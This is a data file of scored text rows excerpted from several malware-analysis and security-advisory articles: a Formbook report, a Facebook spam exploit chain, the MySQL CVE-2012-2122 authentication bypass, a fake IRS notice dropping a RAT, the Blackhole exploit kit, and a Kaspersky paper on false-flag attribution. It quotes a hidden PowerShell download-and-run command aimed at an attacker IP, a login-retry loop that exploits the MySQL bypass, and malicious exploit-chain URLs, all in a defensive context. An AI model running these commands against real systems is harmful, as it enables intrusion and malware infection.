"Formbook will look for the svshost.exe process and terminate if it finds more than two svshost.exe processes running, as shown in Figure 9.",0.01376533627028631
Figure 9: Termination.,0.012137857315791534
Conclusion,0.008171308922719556
"Despite Formbook infostealer having been around for a couple of years now, it only came to public attention after it was extensively used in spam campaigns in late 2017. The fact that Formbook wasn't noticed before is probably because its developers didn't release the builder to the public, so it was easy for them to track its activities and turn it off if they found that it was being used for purposes for which it was not intended or if it was gaining too much attention from the security community. Despite not being broadly used, Formbook represents a real threat, due to it being stealthier and more powerful than keyloggers.",0.012126201046937846
"Similar to the Agent Tesla remote access trojan (RAT), the author of Formbook initially offered a beta version of the product free of charge in order to receive feedback and make improvements.",0.011023117966615814
"The 'ng-Coder' user indicates that Formbook should not be used for malicious purposes, and after the spam campaigns were made public, he blocked Formbook's sales until further notice. According to 'ng-Coder', Formbook should only be used to spy on family members or employees if the user has the explicit right to do so. However, this claim itself is dubious given the barely legitimate nature of the use of such software.",0.00892006206439877
IOCs,0.007762664576204892
The SHA256 hash of the SFX file that was analysed is: 2f74f8518bd14a882a870f3794a76dba381b59c1e40247a2483468959b572d82.,0.014075238183325678
References,0.0158494738281566
"[1] Schwarz, D. The Formidable FormBook Form Grabber. Arbor Networks, 20 September 2017. https://www.arbornetworks.com/blog/asert/formidable-formbook-form-grabber/.",0.012808259892470919
"[2] Villeneuve, N.; Eitzman, R.; Nemes S.; Dean, T. Significant FormBook Distribution Campaigns Impacting the U.S. and South Korea. FireEye, 5 October 2017. https://www.fireeye.com/blog/threat-research/2017/10/formbook-malware-distribution-campaigns.html.",0.016528984108295064
"[3] Urgent server alert malspam delivers formbook trojan via CVE-2017-8570 word doc. My Online Security, 16 February 2018. https://myonlinesecurity.co.uk/urgent-server-alert-malspam-delivers-formbook-trojan-via-cve-2017-8570-word-doc.
",0.009732928902257187
"Facebook users, watch what you click on!
Cybercriminals are currently mass mailing bogus “Facebook Account Cancellation Requests“, in an attempt to trick Facebook’s users into clicking on the malicious link found in the email. Upon clicking on the link, users are exposed to client-side exploits which ultimately drop malware on the affected host.
More details:",0.01127139218064277
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample client-side exploitation chain: hxxp://adlinkservhost.strangled.net -> hxxp://lakkumigdc.com/media/clients/index.php?showtopic=397065 -> hxxp://lakkumigdc.com/media/clients/rhin.jar -> hxxp://lakkumigdc.com/media/clients/Goo.jar -> hxxp://lakkumigdc.com/media/clients/lib.php -> hxxp://lakkumigdc.com/media/clients/load.php?showforum=lib
Sample client-side exploits served: CVE-2010-0188; CVE-2011-3544; CVE-2010-0840
Malicious domain name reconnaissance:
lakkumigdc.com – 68.168.100.135 – Email: dolphinkarthi@gmail.com
Name Server: NS1.MACROVIEWTECH.COM – 68.168.100.136
Name Server: NS2.MACROVIEWTECH.COM – 68.168.100.137
Domains responding to the same IP, including domains also registered with the same GMail account:
drganesanneurospine.com
dryathishoncologist.com
hematologistcoimbatore.com
lakkumigdc.com
ciska.org
texsonpumps.com
icreu2012.com
lakkumigdc.com
paypal.com.tradelinee.com
pianoforall.theseopark.com
update-paypall.32165453423154623166352.indianmjp.com
paypal.com.usa.ssion.secure.acess.update.reg.ideators.co
paypal.com.us.cgi-bin.session.secure.update-info.ideators.co
paypal.com.vtigp.org
zakcreations.com
techhoot.com
ideators.co
Upon successsful client-side exploitation, the campaign drops MD5: 8b3979c1a9c85a7fd5f8ff3caf83fc56 – detected by 3 out of 46 antivirus scanners as PWS-Zbot.gen.aru
Upon execution, the sample creates the following file on the affected hosts:
%AppData%Ixriyvemarosa.exe – MD5: A33684FD2D1FA669FF6573921F608FBB
It also creates the following directories:
%AppData%Ixriyv
%AppData%Uxwonyl
As well as the following Mutex:
Local{7A4AAF46-5391-8FF9-A32F-78A34C8B50D7}
It then phones back to shallowave.jumpingcrab.com (93.174.95.78) on port 8012. Another similar subdomain on this host (takemeout.jumpingcrab.com), was also seen in a crowdsourced DDoS campaign in 2009.
Historically, more malware is known to have been hosted at another subdomain (hxxp://dady.jumpingcrab.com:881/js/js/) in 2011. List of associated MD5s:
MD5: e58fe6d04e8d9fce1020f532d3f0bd49 – detected by 40 out of 44 antivirus scanners as Backdoor.Win32.Delf.yqo
MD5: 60fde61eea4da0601a294d8cac18fb85 – detected by 37 out of 42 antivirus scanners as Backdoor:Win32/Hupigon.EA
MD5: ac95c84a99edd65b00fbc845f8e167f0 – detected by 38 out of 42 antivirus scanners as TrojanDropper:Win32/Delfsnif.A
MD5: 7487bbfadde66edddf131b879382a9ef – detected by 38 out of 43 antivirus scanners as Trojan-PSW.Win32.Bjlog.vge
MD5: 6cf58ce47e4a9163ecf2e5e0498d3fa8 – detected by 38 out of 43 antivirus scanners as Worm.Win32.AutoRun.davw
MD5: a694f0c6a0b64cc3601d946f63330a23 – detected by 34 out of 44 antivirus scanners as Trojan.RAR.Qhost.c
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.009449934099105661
Security Vulnerability in MySQL,0.00570964264037499
"A serious security vulnerability discovered in MySQL was disclosed this weekend. It basically allows anyone to bypass authentication and log in directly into the database. We tried on a few 64bit Ubuntu systems and were able to replicate the issue (it seems that only 64 bit platforms are affected).
Crazy theory: Could this be related to the LinkedIn, last.fm, eHarmony and other recent breaches? Did any of them have MySQL exposed? Even worse, was this really a bug or a very clever backdoor? What you guys think?
Anyway, back to topic. Sergei Golubchik explained the issue in detail:",0.01260539070482869
"We have recently found a serious security bug in MariaDB and MySQL.
So, here, we’d like to let you know about what the issue and its impact
is. At the end you can find a patch, in case you need to patch an older
unsuported MySQL version.",0.009723517772310952
"All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are
vulnerable.",0.013819309577596806
"MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.",0.010936847435365937
"MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.",0.012989216577781959
This issue got assigned an id CVE-2012-2122.,0.01763443372534723
"Here’s the issue. When a user connects to MariaDB/MySQL, a token (SHA
over a password and a random scramble string) is calculated and compared
with the expected value. Because of incorrect casting, it might’ve
happened that the token and the expected value were considered equal,
even if the memcmp() returned a non-zero value. In this case
MySQL/MariaDB would think that the password is correct, even while it is
not.  Because the protocol uses random strings, the probability of
hitting this bug is about 1/256.",0.0106299861011242
"Which means, if one knows a user name to connect (and “root” almost
always exists), she can connect using *any* password by repeating
connection attempts. ~300 attempts takes only a fraction of second, so
basically account password protection is as good as nonexistent.
Any client will do, there’s no need for a special libmysqlclient library.",0.01190979056415209
"Recommendations
If you are running MySQL, make sure to patch it now! Even better, make sure that MySQL is not wide open to the internet and only listening locally. The following iptables rule helps to block remote access to it:",0.014322450023448341
/sbin/iptables -A INPUT -p tcp –dport 3306 -j DROP,0.012098219919333575
"You can also change your my.cnf to only bind to local address, minimizing the effect of the vulnerability:",0.005228904043127591
bind-address=127.0.0.1,0.011437206544137601
"If you also have PHPMyAdmin open, it could be used to leverage this vulnerability (even though we were not able to confirm).
Testing
HD Moore, posted a quick one-liner to check if you are vulnerable:",0.01053009458521692
for i in `seq 1 512`; do echo ‘select @@version;’ | mysql -h 127.0.0.1 -u root mysql –password=X 2>/dev/null && break; done,0.012744237076401488
"We will post more details if anything new comes up.
",0.01995350723282785
"Fake IRS notice delivers customized spying tool
While macro-based documents and scripts make up for the majority of malspam attacks these days, we also see some campaigns that leverage documents embedded with exploits. Case in point, we came across a malicious Microsoft Office file disguised as a CP2000 notice. The Internal Revenue Service (IRS) usually mails out this letter to taxpayers when information is incorrectly reported on a previous return.
Victims that fall for the scam will infect themselves with a custom Remote Administration Tool. A RAT can be utilized for legitimate purposes, for example by a system administrator, but it can also be used without a user’s consent or knowledge to remotely control their machine, view and delete files or deploy a keylogger to silently capture keystrokes.
In this blog post, we will review this exploit’s delivery mechanism and take a look at the remote tool it deploys.
Distribution
The malicious document is hosted on a remote server and users are most likely enticed to open it via a link from a phishing email. The file contains an OLE2 embedded link object which retrieves a malicious HTA script from a remote server and executes it. In turn, it downloads the final payload, all with very little user interaction required since it is using CVE-2017-0199, first uncovered in April 2017 as a zero-day.
82.211.30[.]108/css/CP2000IRS.doc",0.013029462792306212
"The embedded link points to an HTA script hosted under an unexpected location – a Norwegian company’s compromised FTP server – which invokes PowerShell to download and execute the actual malware payload.
ftp://lindrupmartinsen[.]no:21/httpdocs/test/template.hta",0.00926130341658249
"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""
-WindowStyle Hidden (New-Object System.Net.WebClient)
.DownloadFile('http://82.211.30[.]108/css/intelgfx.exe',
'C:\Users\[username]\AppData\Roaming\62962.exe');
Payload
The downloaded payload (intelgfx.exe) extracts to several components into a local folder and achieves persistence using a decoy shortcut. The VBS scripts ensure that the main module runs without showing its GUI, in order to remain invisible to the victim.",0.01200157094156673
"RMS agent stands for Remote Manipulator System and is a remote control application made by a Russian company. It appears that in this case, the attackers took the original program (as pictured below) and slightly customized it, not to mention the fact that they are using it for nefarious purposes, namely spying on their victims.",0.012556014788405956
Its source code shows the debugging path information and name that they gave to the module.,0.009333407037075081
"Office exploits and RATs
This is not the first time that CVE-2017-0199 is used to distribute a RAT. Last August, TrendMicro described an attack where the same exploit was adapted for PowerPoint and used to deliver the REMCOS RAT. It also shows that threat actors often repackage existing toolkits – which can be legitimate – and turn them into full-fledged spying applications.
We reported the compromised FTP server to its owner. Malwarebytes users were already protected against CVE-2017-0199 as well as its payload which is detected as Backdoor.Bot.",0.014052342328160772
"Thanks to @hasherezade for help with payload analysis.
Indicators of compromise
Word doc CVE-2017-0199
82.211.30[.]108/css/CP2000IRS.doc
47ee31f74b6063fab028111e2be6b3c2ddab91d48a98523982e845f9356979c1
HTA script
ftp://lindrupmartinsen[.]no:21/httpdocs/test/template.hta
d01b6d9507429df065b9b823e763a043aa38b722419d35f29a587c893b3008a5
Main package (intelgfx.exe)
82.211.30[.]108/css/intelgfx.exe
924aa03c953201f303e47ddc4825b86abb142edb6c5f82f53205b6c0c61d82c8
RAT module
4d0e5ebb4d64adc651608ff4ce335e86631b0d93392fe1e701007ae6187b7186
Other IOCs from same distribution server
82.211.30[.]108/estate.xml
82.211.30[.]108/css/qbks.exe
",0.010494611975895962
"Blackhole, CVE‑2012‑0507 and Carberp
The Blackhole exploit kit has been updated to version 1.2.3 and includes a new exploit for the Java CVE-2012-0507 vulnerability, which ESET calls Java/ Exploit.CVE-2012-0507",0.008755368287322707
30 Mar 2012 - 01:05AM,0.011651391841114744
"The Blackhole exploit kit has been updated to version 1.2.3 and includes a new exploit for the Java CVE-2012-0507 vulnerability, which ESET calls Java/ Exploit.CVE-2012-0507",0.0085489279604124
"This week Blackhole has been updated to version 1.2.3 and includes a new exploit for the Java CVE-2012-0507 vulnerability, which ESET calls Java/Exploit.CVE-2012-0507. Earlier this week information was published about the Blackhole update by French malware researcher Xylitol and last week Microsoft shared information about an interesting way of breaching the JRE (Java Runtime Environment) sandbox.",0.012772081961638482
"The first information about a working exploit for CVE-2012-0507 was released by the company Immunity with reference to the 7.03.2012 product update of Immunity CANVAS Modules. The first In-the-Wild detections were recognized during the week beginning on March 12, 2012. The CVE-2012-0507 vulnerability was remediated on February 15 as part of a critical patch update advisory. Today a public module for Metasploit Framework was released, working on a range of platforms: Windows, Linux, Solaris and OSX. The Metasploit module for exploitation of CVE-2012-0507 looks the same as the exploit version seen in the updated Blackhole version.",0.008950626457773003
"Java exploits are now a more effective way to install malicious programs: we have already published information about this in our recent posts. Exploit kit developers don’t include 0-days in their products, because that’s a really expensive way to proceed. But among 1-day exploits (exploits based on checking patched versions of software to identify what the vulnerabilities that have been patched actually are), Java vulnerabilities are the number one target. This is the most effective way for exploiting end-user systems and is sometimes effective across a variety of platforms.",0.011231538909320826
This week we have tracked many incidents involving the infection of popular and legitimate Russian sites where iFrames redirect victims to the latest version of Blackhole. Here we look at one of these incidents in detail.,0.012997245234583787
The first stage of execution is the construction of malicious iFrames with code to redirect to the exploit kit resource hxxp://lifenews-sport.org:,0.007184746224617511
The iFrame is visible at the moment of redirection to the original webpage:,0.007730757415142286
After this step is taken we can see the old processing page from the Blackhole exploit kit:,0.007255287020173196
The malicious domain name and infected webpage look to all intents and purposes the same (lifenews-sport.org and lifenews.ru). The same infection method and the same redirection methods are used that we have already seen on the popular news resource izvestia.ru. In both cases modified versions of the Win32/TrojanDownloader.Carberp family were loaded onto the victim machines.,0.013199235364141693
All the infection stages look like this in the traffic we captured:,0.009123336156196649
"You may already remember hearing news of the arrests of Carberp team members. This is a real win, but it’s just one big team using the Carberp bot that was arrested, and other cybercrime groups have evaded arrest so far. The Carberp developers also remain free and are still able to support active cybercrime groups. Carberp kits are not on sale to all and sundry, but are distributed only by trusted cybercrime groups.",0.017799292725259597
"To come back to the exploit detection Java/Exploit.CVE-2012-0507, this is a really interesting vulnerability in the AtomicReferenceArray class implementation, which wasn’t checking properly whether the array was of an appropriate Object[] type. A malicious Java applet could use this flaw to bypass Java sandbox restrictions in order to execute malicious code outside of sandbox.",0.010434807657655587
"The structure of objects in a Java/Exploit.CVE-2012-0507 sample looks like this:
",0.009383948700747546
Wave your false flags! Deception tactics muddying attribution in targeted attacks,0.010853457026271163
Brian Bartholomew & Juan Andrés Guerrero-Saade,0.009415104609262426
"Kaspersky Lab, USA",0.008778898537881497
Copyright © 2016 Virus Bulletin,0.009767502707145992
Abstract,0.009485057568311417
"This paper takes a comprehensive look at the current state of attribution in targeted attack research and at deliberate attempts by the adversary to obstruct this process. The paper includes common bases for attribution, practical and methodological complications, and examples of purposeful abuse by sophisticated threat actors in the wild.",0.014146920571619148
Introduction,0.012036720276026314
"Attribution is often the most prominent point of interest and contention when it comes to threat intelligence, both for direct recipients and the general public alike. Despite this pervasive interest, the attribution phase of the analysis cycle is little understood and the complications that arise therein are often ignored. Similarly, the value of attribution remains largely unquestioned. We will not argue that attribution provides no value. However, a thorough study of the methods for arriving at attribution and the data available to reach these conclusions will reveal the shaky foundation of attribution in threat intelligence and hopefully prove a cautionary tale for threat intelligence producers as well as recipients making decisions on the basis of attribution claims. At a time when 'hacking back' is discussed as a legitimate option for victims, and governments are willing to take heavy-handed geopolitical retribution on the basis of threat intelligence products, misattribution can have a hefty cost.",0.014537739140598194
"Moreover, attackers aware of the reactions taken by victim nations and companies in the face of audacious attribution claims may seek this tertiary effect purposefully. Acknowledging the space for error in attribution, threat intelligence circles often raise this possibility under the vague threat of 'false flag operations'. However, little has been provided publicly to substantiate this possibility. As part of our work in Kaspersky Lab's Global Research and Analysis Team (GReAT), we have been uniquely positioned to witness both general and specific cases of manipulation of indicators by attackers of medium-to-advanced skill attempting to mislead researchers and other nosy onlookers. Rather than resort to innuendo, we will provide multiple and diverse examples of manipulation that showcase the abuse potential currently being exploited by attackers in the wild.",0.012030827822307466
"By substantiating the case for false flags, we intend to raise a general awareness of the complications involved in investigating targeted attacks. We hope that these cautionary tales will also reach the consumers of threat intelligence products to temper their expectations and reactions to attribution claims and hopefully dull the edge currently leveraged by cunning attackers interested in casting blame for their nefarious activities onto unsuspecting nation states or unrelated threat actors.",0.01412719477062474
"What follows will cover the general approach to attribution and its basis. We will then present overviews of multiple examples of purposeful manipulation of attributory indicators to showcase different forms of manipulation, each displaying varying degrees of cunning and success potential. Armed with these examples, we will explore general and methodological complications. Finally, we discuss some general reflections to further a deeper discussion of the value and risks of attribution for consumers and producers alike.",0.0166795882821702
Attributing targeted attacks,0.00906643368289628
"The expression 'attribution is hard' is often bandied about, either apologetically or in jest. It's easier than explaining that, in fact, attribution relies on a combination of fungible technical indicators, mistakes, overlaps, and luck. Sloppy or careless operators (such as those nation-state actors who believe they can act with impunity) are wont to provide more data than they should, like debug paths and language strings, or to reuse infrastructure from previous attacks, which allows researchers to group them into a threat actor cluster. Sometimes our luck is such that an IP address will point us at an incriminating location or we find a widely reused handle rife with personal information. Other times, there are little to no indicators pointing us in any particular direction. Attribution is an important part of the threat intelligence (TI) process but it isn't one that can always be fulfilled with any certainty.",0.016026227506635626
"Though the analysis process adapts and changes on a case-to-case basis, we can discuss the most common bases for attribution claims encountered during targeted attack research. What follows should impress the reader as to the inexactitude and need for interpretation in every step of the attribution process. Heaping several of these indicators together may paint a more cohesive picture but it is nonetheless a series of intuitions ideally (but not always) pointing in the same direction. The question to keep in mind is 'what makes a satisfactory attribution claim?', particularly the sort with such certainty as to justify further action (be it legislative, political, law enforcement, or retaliatory CNA - a topic further addressed in the final section of this paper).",0.014835385466477446
Timestamps,0.010364075849251253
"A great benefit of the Portable Executable file format is the inclusion of compilation times. Though these can be altered with ease, many samples include original timestamps. Beyond an obvious indication of an actor's longevity, timestamps allow for an understanding of specific campaigns as well as the evolution of an actor's toolkit throughout the years. With a large enough collection of related samples, it's also possible to create a timeline of the campaign operators' workday. Where these operate in any professional setting or with any semblance of discipline, it's possible to match the normal peaks and troughs of a workday and pinpoint a general timezone for their operations.",0.014443535524862772
"Strings, debug paths, and metadata",0.008134632551633936
"Malware binaries often include several artifacts of their construction in the form of strings and debug paths. Even perfectly innocuous strings used to describe the normal operations of a backdoor can give away impressions of the malware authors. The most obvious is their preferred language, particularly when it comes to rare languages in the targeted attack landscape, but also indicating language proficiency with broken English showcasing the colloquial shortcomings of the coder. Among these strings, a favourite of TI researchers is the debug path: a string describing the folder structure leading up to files from the time of development that made its way into the final binary. Debug paths most often reveal a username but may also (in the case of organized coders) reveal internal naming conventions like internal tool, project or campaign names.",0.01463810849373326
"Another telling resource is the presence of metadata both in malware binaries as well as dropper files like decoy or macro documents. From time to time, binary resources will contain language IDs that reflect the configuration of the developer's system in telling ways, perhaps pointing to the system's native language. Phishing documents are also often riddled with metadata. Disciplined actors regularly employ virtual machines with nondescript usernames and software registrations, usually reflecting the use of pirated software with common file attributes or resources pointing to generic, publicly traded exploit kits. However, metadata will occasionally include original user handles and unintentional save state information that points to the actual author's machine.",0.015450149182681505
Infrastructure and backend connections,0.007874193852759337
"A preferred method for grouping targeted attack activity together is through cataloguing of the malicious use of network infrastructure. Command-and-control infrastructure can be costly and difficult to maintain, with the added complication that availability may be disrupted by researchers, law enforcement, or a spooked system administrator (in the case of compromised infrastructure). Even well-resourced attackers have a tendency for reusing command-and-control or phishing infrastructure. For threat intelligence teams building databases of targeted attack-related infrastructure, this is often the most telling sign of an attacker resurfacing or retooling. In rare instances, multiple attack groups may go after the same vulnerable server (particularly with teams that insist on using compromised infrastructure rather than mounting their own) but this remains rare enough to be an outlier. The trend at this time remains that even in cases of infrastructure reuse between teams, these occur within the same threat actor cluster (as in the case of multiple independent 'Chinese-speaking' threat actors getting their hands on the same zero-days, some overlapping infrastructure, or sharing lateral movement tools – a situation that speaks more to the tasking arrangement or 'community' of attackers in this cluster than to a breakdown in attribution methods).",0.01708713638602044
"In the case of researchers with a privileged point of view, such as those working with email services, ISPs, or those providing support for a compromised server, backend connections can be a serendipitous and often telling attributory indicator. What we mean by 'backend connections' are connections that take place when an attacker retrieves data from an exfiltration server or email account, prepares a staging or phishing server, or checks in on a compromised domain to assure its continued availability. Attackers almost always use Tor or some other anonymizing service to mask this connection but mistakes happen more often than not. The mistake will likely provide researchers with an IP or a region telling of the native operations of the attacker.",0.012716866636180213
Toolkits,0.008226903272770647
Malware families,0.007884895569342909
"Although even the most advanced threat actors may rely on publicly available tools, most take the time to build their toolkits and develop custom backdoors, lateral movement tools, and exploits. Knowing the value of what they've developed, actors will jealously guard their toolkit, thereby allowing researchers to hone in on a threat actor by the presence of a tightly controlled malware family. In simpler terms: if Snake is present then it looks like Turla; if WildPositron malware is found then it's probably Lazarus, and so on. It's important to remember that 'malware ownership' isn't static. Just as the malware itself develops over time, the ownership may be transferred. It can be shared with other teams in the same cluster, developers may leave or set up their own shops, or source code may leak through a variety of circumstances.",0.01244229373457617
Code reuse,0.007474956235683616
"In cases where an actor has been exposed or has found other motivations for a top-down retooling, code reuse can indicate a relationship between currently used tools and their predecessors. Coders can be quite lazy and even when the intention is a full retooling, malware developers will often reuse specific functions or pieces of code that have worked well in the past. This means that the avid researcher or obsessive yara rule writer may be able to hone in on these traits and connect new and old campaigns, or even seemingly unrelated threat actors.",0.015636378577605137
Passwords,0.009003566062774304
"A similar circumstance applies to the reuse of passwords. These may be the passwords to email accounts used for phishing or exfiltration, accounts on compromised servers, or hard-coded passwords in malware components. A recent example saw a threat actor deploying droppers with password-protected resources that contained the actual payload in an attempt to thwart sandboxes and automatic detection systems. The hard-coded password protecting the resource was the same even when different, seemingly unrelated malware families were being dropped, thus allowing researchers to tie the two malware families to the same actor. This also applies to hard-coded encryption keys in different malware families or campaigns.",0.012448531731099721
Exploits,0.006498191279907806
"Finally, zero-day exploits are a great source of excitement in research circles these days. The presence of an '0-day' immediately sets an actor apart from the run-of-the-mill attackers, thus justifying greater researcher involvement. Though exploits may be repurposed or acquired from public sources, a greater emphasis on responsible disclosure has limited the availability of the latter by dissuading the release of fully developed 'proof-of-concept' code that may aid attackers in leveraging newly discovered exploits. (An example is the quick adoption by DarkHotel of a Flash zero-day found in the reckless full release of the HackingTeam trove [1].) That said, many advanced attackers have exploit developers in house, with some threat actors unleashing a seemingly unlimited supply of exploits where needed.",0.011011884364268032
"With a given exploit being an arcane and jealously guarded weapon in the attacker's arsenal, home grown implementations of an exploit allow researchers to group together diverse malware families or separate campaigns to a given cluster. When a specific implementation of a zero-day appears in separate unrelated instances within a given timeframe (even long after the zero-day was identified and patched), it signifies code sharing likely pointing to the same actor or activity cluster. Despite discussions of parallel discovery [2] of exploits by different vulnerability researchers in a given timeframe, exploit implementations differ. However, this does not entirely discount the possibility of a double-dealing seller in the black or grey market or other unexpected threat actor interactions like exploit repurposing, as evidenced with Equation team's reuse of CVE-2013-3918 within a couple of days of its initial use by the Aurora actors [3]. One also cannot discount the nefarious possibility that a disclosed exploit repository itself has been hacked, as this represents a boon for an advanced attacker with indisputable return on investment.",0.012165411247519797
Tasking,0.009844457161194864
"A final oft ignored tell of targeted attacks are the chosen targets themselves as they represent the intent propelling forward a well resourced espionage operation. Though many indicators may be faked or altered, the dynamic between attacker and victim is harder to hide or directly manipulate as it involves 'real-world' publicly known circumstances or geopolitical conflicts. The threat intelligence space represents an unprecedented circumstance in which an unrelated third party with an unexpected vantage point can have situational awareness over large swathes of the targets of a secretive intelligence organization. For research teams with gifted analysts, this insight allows for attacker profiling. A possible outcome is the mapping of a campaign to a geopolitical or regional situation that may point in the direction of a given perpetrating organization or nation. Or in the case of a resurgent retooled threat actor, witnessing them revisiting the 'old favourites' can be a telling sign connecting a new actor with a known cluster of activity, particularly when the new attacks leverage previously pilfered insights into the victim's network or 'pattern of life'.",0.015259613352835433
"However, the study of tasking alone is largely interpretative and faces common pitfalls derived from cognitive biases and geopolitical oversimplifications, already familiar to intelligence analysts. Further complications arise from the particularities of certain targets and attackers alike. For example, some targets are so attractive by their very nature and position as to attract the interest of several different actors simultaneously. Also, certain threat actor configurations break this paradigm entirely, as will be discussed further in the next section.",0.012429419651769358
A cunning menagerie In the Wild,0.010018982153411349
"In order to delve into specific examples, we require two distinct allowances from the reader:",0.010410836058436401
"The first regards the use of attribution examples. As should have become apparent by now, attribution claims are far from certain and often sparsely substantiated. As part of a company and a research team that is cautious to remain attribution agnostic, we toe this line respectfully and with good reason. In the process of discussing in-the-wild examples of manipulation of attribution leads, it may be necessary to point to commonly held beliefs or rumours as to the provenance of certain threat actors in order to showcase where the indicators falter. We ask the reader to treat these as what they are: rumours heard through the attribution grapevine, the sort of RUMINT that associates a threat actor with a country, region, or organization.
These are not our own assertions or claims. We remain steadfast in our conviction of the complexities of the attribution problem and would prefer not to be quoted by overzealous readers as asserting attribution claims that are not our own.
At times our own research may support these intuitions but we do not go so far as to make these attribution claims our own.",0.01249403674438554
"Secondly, despite the liberties provided by an academically toned industry publication, we remain bound by corporate realities, respect for the research methods of collaborators, and, most of all, legal constraints. As such, we may not always be able to provide full disclosure of indicators involved in certain findings. As we do not seek to recreate the process of each investigation, we feel these are not vital to convey the main thrust of our argument, which is that intermediate-to-advanced threat actors are aware of attribution methods and are already attempting to manipulate researchers to expend limited resources chasing ghost leads. Where gaps arise, let us relegate these accounts to camp fire re-tellings among friends.",0.013410255830593076
"We thank the reader for these allowances, providing a lacuna between authors and content, in order to further a wider discussion about the complexities of attribution that could not happen otherwise.",0.01609782420935435
On language – Cloud Atlas,0.010603608598814152
"In December 2014, Blue Coat exposed a newly discovered malware framework dubbed 'Inception' [4, 5], which was later attributed to a new actor named 'Cloud Atlas' [6]. Cloud Atlas is believed to have been born from a previous actor tracked as 'Red October' [7]. Whether Cloud Atlas is the same actor or a spin-off of the original, this case posed some interesting analytical problems when it came to attribution. The current belief is that both teams are likely Eastern European-based and most likely Russian-speaking. Cloud Atlas may be a spin‑off from the original group following conflicts arising from the annexation of Crimea in the spring of 2014.",0.017604563436899312
"During the investigation of this new campaign, various oddities were discovered that seemed to disprove the belief that Cloud Atlas was Eastern European. It was only after analysing these breadcrumbs in conjunction with each other that the determination was made that Cloud Atlas was most likely 'muddying the water' in order to make attribution more difficult. Targeting seemed to fit the original campaign, as the majority of attacks were heavily focused on Russia, specifically government and diplomatic entities. Very similar, if not identical lure documents were used in the two campaigns. Also, the implementation of compression algorithms was nearly identical in both, with the Cloud Atlas version showing slight improvement. But this is where the similarities stop, and the weirdness starts:",0.016188997897079505
"One of the early lure documents discovered in this campaign pertained to Russian government officials but was titled in Spanish. Further analysis of metadata from the original lure document showed it was created on a native Spanish speaker's system. Initially, this caused a bit of confusion, but it was later determined that the lure document was most likely stolen from an advisor in the Spanish Embassy in Moscow and repurposed for use in attacks.",0.011827191550296434
The infrastructure used by Cloud Atlas to manage victim data and implants was also interesting. The actors used a large pool of IP addresses in a 'round robin' fashion to access the cloud-based provider used to host payloads and store exfiltrated data. Geolocation of the IP addresses showed the actors as mainly originating from South Korea. Later analysis revealed that these IP addresses were mostly compromised home routers which contained a small proxy implant.,0.016691447432069406
"Focusing on language clues left behind in the malware caused further attribution issues, as conflicting indicators were peppered into the mobile implants:",0.008315683978590727
"Arabic
strings in the
BlackBerry
version",0.009660244311117339
"Hindi characters in the
Android
version",0.009440933302977017
"God_Save_The_Queen
was found in the
BlackBerry
version",0.007686629603149253
"'JohnClerk' was found in the project path for the
iOS
version",0.009618950661956172
"The presence of these various conflicting strings in different versions of the malware could either mean that the actors borrowed code from various sources to use in their implants, or that the strings were purposely placed to misguide researchers.",0.0132511020520375
"During the investigation, many researchers were running the various samples found in the wild in an effort to solicit a second‑stage binary from the actors. In multiple instances, an implant was served up to researcher machines that did not fit the typical Cloud Atlas framework. This implant showed characteristics of malware traditionally considered Chinese and used a command-and-control domain that was inactive at the time. The belief is that the actors recognized researcher systems in their logs and instead of serving the normal second-stage binary, they instead provided a 'fake', unrelated piece of malware to cause confusion.",0.011793552574918542
"Blue Coat researchers did an excellent job in their original paper describing the various paths attempted for attribution, only to hit a dead end or to find nonsense data. This is a great example of how certain APT actors are aware of the indicators we as researchers tend to latch onto, and are already purposely modifying those characteristics.",0.010912172538659282
On tasking – Wild Neutron,0.008666632221540738
"Wild Neutron (also known as: Morpho, Butterfly, ZeroWing, or Jripbot) is a crowd favourite when it comes to complicated attribution research, complete with apocryphal tales and red herrings. Wild Neutron first rose to prominence in 2013 [8], though evidence shows the group was active as early as 2011. Their reputation is in large part thanks to their ambitious targeting, bagging whales like Apple, Facebook, Microsoft and Twitter. Their arsenal included multi-platform malware [9], a Java zero-day (CVE-2013-0422), and a penchant for well-chosen watering-hole sites. After close to a year of silence, Wild Neutron returned for a 2015 campaign, this time with a stolen digital certificate and a still undiscovered Flash zero-day exploit. Throughout, attribution has been a maze of contradictory indications and false starts that continue to elude researchers.",0.013959736425630198
"Some of the simpler misleads are found in the Windows malware where language strings were found both in Romanian ('la revedere' meaning 'goodbye') and Russian ('uspeshno', a transliteration of 'successfully'). Other leads include a false connection to a well known researcher, connections to apparent scam artists, investment funds, and even a seemingly successful cryptocurrency scam. (These attributory hypotheses and the supporting indicators are presented in the Kaspersky Private Intel Report on Wild Neutron pushed to subscribers in July 2015.) But Wild Neutron presents a deeper challenge for analysts than this particular hodgepodge of indicators, one that speaks to the possible nature of the threat actor as a mercenary entity. Usually a situation so convoluted would find some semblance of resolution by looking at the victim spread, the sort of organizations and entities targeted by the threat actor. In this case, the victim spread does little to assuage our uncertainty.",0.01125948783878139
"Looking at Wild Neutron's targeting, no one clear nexus of interest is apparent:",0.014521285031542597
Large company groups involved in M&A,0.010491004529572301
Real estate companies,0.009977733756339702
Bitcoin-related companies,0.010967197353981106
Investment firms,0.010307262422907137
IT companies,0.008336423562424033
Healthcare companies,0.009238217163156426
Law firms,0.009629115374022779
Developers (iOS and Linux),0.012175127068165703
"With victims in over 11 countries (visibility courtesy of the Kaspersky Security Network (KSN) and Kaspersky sinkholes of Wild Neutron command-and-control infrastructure) and multiple verticals, we can perhaps assume several different and possibly overlapping nexuses of interest that may suggest multiple tasking entities or diverging mission imperatives. Another noteworthy observation is the lack of victims in diplomatic or government institutions, a customary vertical for a threat actor of this calibre. This stands in juxtaposition to what is presumably counterterrorism tasking with the compromise of the Ansar alMujahideen forum. Researchers concluded that the tasking was in line with a mercenary arrangement, taking tasking from different entities and imperatives, including a financial incentive to pilfer tradeable financial information on mergers and acquisitions. This type of threat actor, while unlikely to remain rare, by its very nature dismantles our ability to form a generalized attributory claim on the basis of tasking alone.",0.013490735709587476
On hacktivism,0.01086440384234455
